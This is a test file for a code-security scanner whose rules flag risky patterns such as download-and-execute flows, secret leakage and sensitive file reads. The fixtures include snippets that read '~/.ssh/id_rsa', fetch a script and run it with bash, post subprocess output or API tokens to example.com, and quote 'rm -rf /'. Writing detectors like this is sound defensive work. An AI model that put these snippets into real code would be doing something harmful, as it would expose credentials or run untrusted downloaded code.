import { describe, expect, it } from "vitest";

import type { Rule, ScanFile } from "../src/core/types.js";
import { broadFilesystemRule } from "../src/rules/broad-filesystem.js";
import { downloadWriteExecRule } from "../src/rules/download-write-exec.js";
import { dynamicCodeExecRule } from "../src/rules/dynamic-code-exec.js";
import { envSecretExposureRule } from "../src/rules/env-secret-exposure.js";
import { outboundFetchRule } from "../src/rules/outbound-fetch.js";
import { sensitiveLocalDataRule } from "../src/rules/sensitive-local-data.js";
import { shellExecRule } from "../src/rules/shell-exec.js";
import { subprocessNetworkExfilRule } from "../src/rules/subprocess-network-exfil.js";

function scan(rule: Rule, content: string, relativePath = "src/example.ts") {
  const file: ScanFile = {
    absolutePath: `/tmp/${relativePath}`,
    relativePath,
    content,
    lines: content.split(/\r?\n/)
  };
  return rule.evaluate([file]);
}

describe("parser-backed rule regressions", () => {
  it.each(["node:fs/promises", "fs/promises"])("supports named filesystem imports from %s", (moduleName) => {
    const content = `import { readFile } from "${moduleName}";\nexport function read(input: { path: string }) { return readFile(input.path, "utf8"); }`;
    expect(scan(broadFilesystemRule, content)).toHaveLength(1);
  });

  it("supports aliased and namespace fs/promises imports", () => {
    const aliased = 'import { readFile as read } from "node:fs/promises";\nexport function load(input: { path: string }) { return read(input.path, "utf8"); }';
    const namespace = 'import * as fsp from "fs/promises";\nexport function load(input: { path: string }) { return fsp.readFile(input.path, "utf8"); }';
    expect(scan(broadFilesystemRule, aliased)).toHaveLength(1);
    expect(scan(broadFilesystemRule, namespace)).toHaveLength(1);
  });

  it("keeps filesystem import forms equivalent for sensitive paths", () => {
    const modules = ["node:fs", "fs", "node:fs/promises", "fs/promises"];
    const results = modules.map((moduleName) => scan(
      sensitiveLocalDataRule,
      `import { readFile } from "${moduleName}";\nexport function load() { return readFile("~/.ssh/id_rsa", "utf8"); }`
    ));
    expect(results.every((findings) => findings.length === 1)).toBe(true);
    expect(new Set(results.map((findings) => findings[0]?.confidenceReason))).toEqual(new Set(["fixed-sensitive-local-path"]));
  });

  it("does not treat unrelated local filesystem-like functions as Node filesystem APIs", () => {
    const content = 'function readFile(path: string) { return path; }\nexport function load(input: { path: string }) { return readFile(input.path); }';
    expect(scan(broadFilesystemRule, content)).toHaveLength(0);
    expect(scan(sensitiveLocalDataRule, 'function readFile(path: string) { return path; }\nreadFile("~/.ssh/id_rsa");')).toHaveLength(0);
  });

  it("keeps static URL filesystem paths out of broad non-literal findings", () => {
    const content = 'import * as fs from "node:fs"; export function list() { return fs.readdir(new URL("./data", import.meta.url)); }';
    expect(scan(broadFilesystemRule, content)).toHaveLength(0);
  });

  it("ignores executable-looking text in comments and strings", () => {
    const content = '// eval("untrusted")\n/* exec("rm -rf /") */\nconst docs = "fetch(https://example.com)";';
    expect(scan(dynamicCodeExecRule, content)).toHaveLength(0);
    expect(scan(shellExecRule, content)).toHaveLength(0);
    expect(scan(outboundFetchRule, content)).toHaveLength(0);
  });

  it("still detects direct eval, new Function, and imported VM calls with stable lines", () => {
    const content = 'const first = eval("1 + 1");\nconst second = new Function("return 2");\nimport { runInNewContext as run } from "node:vm";\nrun("1 + 2");';
    const findings = scan(dynamicCodeExecRule, content);
    expect(findings.map((finding) => finding.line)).toEqual([1, 2, 4]);
  });

  it("requires download, write, and execution to share one connected scope", () => {
    const content = 'import { writeFile } from "node:fs/promises";\nimport { execa } from "execa";\nexport function ping() { return fetch("https://example.com"); }\nexport function save() { return writeFile("/tmp/cache", "x"); }\nexport function run() { return execa("bash", ["/tmp/cache"]); }';
    expect(scan(downloadWriteExecRule, content)).toHaveLength(0);
  });

  it("rejects same-scope download/write/exec calls with unrelated values or reverse order", () => {
    const unrelated = 'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function run() { const response = await fetch("https://example.com"); await writeFile("/tmp/a", "fixed"); return execa("bash", ["/tmp/a"]); }';
    const reverse = 'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function run() { await execa("bash", ["/tmp/a"]); const response = await fetch("https://example.com"); return writeFile("/tmp/a", await response.text()); }';
    expect(scan(downloadWriteExecRule, unrelated)).toHaveLength(0);
    expect(scan(downloadWriteExecRule, reverse)).toHaveLength(0);
  });

  it("does not propagate later assignments backward or equate unrelated property names", () => {
    const laterAssignment = 'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function run() { const response = await fetch("https://example.com"); let data = "fixed"; await writeFile("/tmp/a", data); data = await response.text(); return execa("bash", ["/tmp/a"]); }';
    const propertyNames = 'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function run(paths: { artifact: string }, other: { artifact: string }) { const response = await fetch("https://example.com"); await writeFile(paths.artifact, await response.text()); return execa("bash", [other.artifact]); }';
    expect(scan(downloadWriteExecRule, laterAssignment)).toHaveLength(0);
    expect(scan(downloadWriteExecRule, propertyNames)).toHaveLength(0);
  });

  it("detects a connected download/write/exec flow", () => {
    const content = 'import { writeFile } from "node:fs/promises"; import { execa } from "execa"; export async function run() { const response = await fetch("https://example.com/tool"); const data = await response.text(); const path = "/tmp/tool.sh"; await writeFile(path, data); return execa("bash", [path]); }';
    expect(scan(downloadWriteExecRule, content)).toHaveLength(1);
  });

  it("requires subprocess output to reach the network request", () => {
    const unrelatedFunctions = 'import { execa } from "execa"; export function run() { return execa("git", ["status"]); } export function ping() { return fetch("https://example.com"); }';
    const unrelatedValues = 'import { execa } from "execa"; export async function run() { await execa("git", ["status"]); return fetch("https://example.com", { body: "fixed" }); }';
    expect(scan(subprocessNetworkExfilRule, unrelatedFunctions)).toHaveLength(0);
    expect(scan(subprocessNetworkExfilRule, unrelatedValues)).toHaveLength(0);
  });

  it("tracks one-hop subprocess output into a request body", () => {
    const content = 'import { execa } from "execa"; export async function run() { const result = await execa("git", ["status"]); const payload = result.stdout; return fetch("https://example.com", { method: "POST", body: payload }); }';
    expect(scan(subprocessNetworkExfilRule, content)).toHaveLength(1);
  });

  it("does not expose an unused secret because an unrelated return follows", () => {
    const content = 'export function version() { const token = process.env.API_TOKEN; return "1.0.0"; }';
    expect(scan(envSecretExposureRule, content)).toHaveLength(0);
  });

  it("does not expose a secret used only in a local comparison", () => {
    const content = 'export function enabled() { const token = process.env.API_TOKEN; return token === "enabled"; }';
    expect(scan(envSecretExposureRule, content)).toHaveLength(0);
  });

  it("does not propagate a later secret assignment backward into an earlier sink", () => {
    const content = 'export async function send() { const token = process.env.API_TOKEN; let payload = "safe"; await fetch("https://example.com", { body: payload }); payload = token; }';
    expect(scan(envSecretExposureRule, content)).toHaveLength(0);
  });

  it.each([
    'export function leak() { return process.env.API_TOKEN; }',
    'export function leak() { const token = process.env["API_TOKEN"]; console.log(token); }',
    'export async function leak() { const token = process.env.API_TOKEN; const auth = token; return fetch("https://example.com", { headers: { authorization: auth } }); }',
    'import { execFile } from "node:child_process"; export function leak() { const token = process.env.API_TOKEN; return execFile("tool", [token]); }'
  ])("detects direct and one-hop secret flows: %s", (content) => {
    expect(scan(envSecretExposureRule, content)).toHaveLength(1);
  });

  it("does not classify ordinary environment variables as secrets", () => {
    expect(scan(envSecretExposureRule, 'export function mode() { return process.env.NODE_ENV; }')).toHaveLength(0);
  });
});
